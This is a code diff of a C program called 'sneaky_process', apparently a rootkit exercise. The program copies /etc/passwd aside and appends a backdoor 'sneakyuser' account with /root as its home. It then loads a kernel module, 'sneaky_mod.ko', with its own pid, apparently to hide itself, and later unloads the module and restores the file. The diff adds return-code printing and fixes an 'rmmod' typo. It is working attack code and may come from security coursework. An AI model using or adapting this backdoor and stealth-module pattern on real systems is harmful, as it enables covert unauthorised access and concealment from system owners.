@@ -8,15 +8,19 @@ int main(int argc, char * argv[]){
     printf("sneaky_process pid = %d\n", getpid());
     
     //2nd, print a new line to the end of the corresponding file.
-    system("cp /etc/passwd /tmp/passwd");
+    int c = system("cp /etc/passwd /tmp/passwd");
+    printf("%d", c);
     //
-    system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");
-
+    c = system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");
+    printf("%d", c);
     //3rd, load the sneaky module
 
     char argvSneaky[100];
-    sprintf(argvSneaky, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
-    system(argvSneaky);
+    sprintf(argvSneaky, "insmod sneaky_mod.ko spid=%d", (int)getpid());
+    //printf((const char *)argvSneaky);
+
+    c = system(argvSneaky);
+    //printf("%d",c);
 
     //4th, reading loop
 
@@ -25,7 +29,7 @@ int main(int argc, char * argv[]){
     }
     // 5th unload the module
 
-    system("rmmode sneaky_mod.ko");
+    system("rmmod sneaky_mod.ko");
 
     //6th restore the /etc/passwd file
     system("cp /tmp/passwd /etc/passwd");
